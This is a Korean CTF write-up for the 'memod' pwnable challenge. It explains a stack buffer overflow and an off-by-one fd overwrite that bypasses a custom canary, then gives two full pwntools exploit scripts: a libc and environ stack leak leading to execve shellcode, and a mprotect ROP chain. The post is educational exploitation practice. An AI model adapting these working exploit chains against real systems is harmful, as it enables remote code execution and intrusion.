+++
title = "memod"
date = "2024-07-08"
description = "pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "loop codition", "improper check", "bof", "rop"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/memod'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

### Goal
``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...
  fd = open("/dev/urandom", 0);

  read(fd, &canary_backup, 4u);
  canary = canary_backup;

  if ( memcmp(&canary_backup, &canary, 4u) )
  {
    puts("***** ERROR! Stack Smash Attempt .. *****");
    exit(-1);
  }
  ...
}
```

전역변수인 `canary_backup`에 4바이트 랜덤값을 `/dev/urandom`으로부터 읽어오고, 그 값을 지역변수인 `canary`에 저장했다가 끝날 때 비교를 한다.
만약 값이 바뀌었다면 프로세스를 강제종료시키므로, 이를 잘 우회해야 한다.


## 0x01. Vulnerability
``` c
  char s[256]; // [esp+10h] [ebp-128h] BYREF
  fgets(s, 512, stdin);
```

첫 번째로 눈에 띈 것은 `ebp-0x128`에 위치한 `s`에 512바이트 입력을 받아 BOF 취약점이 발생한다는 것이었다.
다만 앞에서도 언급했듯 `canary`를 잘 우회해야 한다.

``` c
  char file[32]; // [esp+110h] [ebp-28h] BYREF
  int fd; // [esp+130h] [ebp-8h]

  for ( i = 0; i <= 32; ++i )
  {
    s[0] = getchar();
    if ( s[0] - (unsigned int)'0' > 9 )
    {
      file[i] = 0;
      break;
    }
    file[i] = s[0];
  }
```

다음으로 눈에 띈 것이 for문의 조건문이다.
`file` 배열이 32바이트인 반면 조건문이 `i <= 32`로 되어있기 때문에 마지막 loop에서 `file[32]`가 `fd`의 가장 하위 바이트를 가리키게 된다.


## 0x02. Exploit
위 취약점을 이용해서 `fd`를 overwrite하게 되면 생기는 문제는 다음과 같다.

``` c
  fd = open("/dev/urandom", 0);
  read(fd, &canary_backup, 4u);
  canary = canary_backup;
```

애써 `/dev/urandom`을 `open()`해서 저장한 `fd`가 엉뚱한 값으로 바뀌게 된다.
`fd`를 0으로 덮어서 `stdin`을 만들어 내가 입력을 줄 수도 있고, 엉뚱한 `fd`가 있으면 프로세스를 종료되지 않고, `canary_backup`에 아무런 값이 써지지 않기 때문에 엉뚱한 값으로 덮어도 된다.

따라서 `fd`를 엉뚱한 값으로 덮고 지역 변수인 `canary`에 `0x00000000`을 넣어주면 `memcmp()`를 통과할 수 있다.

``` bash
[*] '/home/user/memod'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

이제 exploit을 위해서 바이너리를 살펴보니 NX가 꺼져있어서 쉘코드를 통해 쉘을 띄우려고 했다.
**그런데 아무리 찾아봐도 stack leak이 될만한 부분이 없었다...**
고민하는 과정에서 libc에 있는 `environ` 변수를 이용한 stack leak 기법을 찾았는데, 한번도 이렇게 leak을 해본 적이 없어서 이를 활용한 payload를 작성했다.

물론 ROP로도 풀이가 가능해서 `mprotect()`를 이용한 ROP로도 payload를 작성했다.


## 0x03. Payload
### Payload Using `environ`
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "memod"
LIBRARY = "libc.so.6"

bp = {
    'read_of_main' : 0x08048703,
    'fgets_of_main' : 0x804875a,
    'canary_backup' : 0x08049b2c,
    'end_of_main' : 0x080487ce,
}

gs = f'''
b *{bp['fgets_of_main']}
b *{bp['end_of_main']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    # leak libc
    s.send(b"1" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"A" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"BBBB"                  # sfp
    payload += p32(elf.plt['puts'])     # ret #1
    payload += p32(0x080485e4)          # ret #2 (pop ret gadget)
    payload += p32(elf.got['write'])    # argument #1
    payload += p32(elf.symbols['main']) # ret #3
    s.sendline(payload)
    r = s.recv(1024)
    libc = u32(r[0:4]) - lib.symbols["write"]
    environ = libc + lib.symbols['environ']
    log.info(f"libc : {hex(libc)}")
    log.info(f"environ : {hex(environ)}")

    # leak stack
    s.send(b"2" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"C" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"DDDD"                  # sfp
    payload += p32(elf.plt['puts'])     # ret #1
    payload += p32(0x080485e4)          # ret #2 (pop ret gadget)
    payload += p32(environ)             # argument #1
    payload += p32(elf.symbols['main']) # ret #3
    s.sendline(payload)
    r = s.recv(1024)
    stack = u32(r[0:4])
    log.info(f"stack : {hex(stack)}")

    # execute shellcode
    s.send(b"3" * 33)
    s.recv(1024)

    payload = asm(shellcraft.execve("/bin/sh", 0, 0))   # shellcode
    payload += b"E" * (0x124 - len(payload))            # dummy
    payload += b"\x00\x00\x00\x00"                      # canary
    payload += b"FFFF"                                  # sfp
    payload += p32(stack - 0x1cc)                       # ret #1 (&shellcode)
    s.sendline(payload)

    s.interactive()

if __name__=='__main__':
    main()
```

### Payload Using `mprotect`
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "memod"
LIBRARY = "libc.so.6"

bp = {
    'read_of_main' : 0x08048703,
    'fgets_of_main' : 0x804875a,
    'canary_backup' : 0x08049b2c,
    'end_of_main' : 0x080487ce,
    'mprotect' : 0xf7e9f020,
}

gs = f'''
b *{bp['end_of_main']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    # leak libc
    s.send(b"1" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"A" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"BBBB"                  # sfp
    payload += p32(elf.plt['puts'])     # ret #1
    payload += p32(0x080485e4)          # ret #2 (pr gadget)
    payload += p32(elf.got['write'])    # argument #1
    payload += p32(elf.symbols['main']) # ret #3
    s.sendline(payload)
    r = s.recv(1024)
    libc = u32(r[0:4]) - lib.symbols["write"]
    mprotect = libc + lib.symbols['mprotect']
    read = libc + lib.symbols['read']
    log.info(f"libc : {hex(libc)}")
    log.info(f"mprotect : {hex(mprotect)}")
    log.info(f"read : {hex(read)}")

    # add permission using mprotect
    s.send(b"2" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"C" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"DDDD"                  # sfp
    payload += p32(mprotect)            # ret #1
    payload += p32(0x08048836)          # ret #2 (pppr gadget)
    payload += p32(bp['canary_backup'] & 0xfffff000) # argument #1
    payload += p32(0x1000)              # argument #2
    payload += p32(0x7)                 # argument #3
    payload += p32(read)                # ret #3
    payload += p32(bp['canary_backup']) # ret #4
    payload += p32(0)                   # argument #1
    payload += p32(bp['canary_backup']) # argument #2
    payload += p32(0x100)               # argument #3
    s.sendline(payload)

    # send shellcode
    payload = asm(shellcraft.execve("/bin/sh", 0, 0))
    s.sendline(payload)

    s.interactive()

if __name__=='__main__':
    main()
```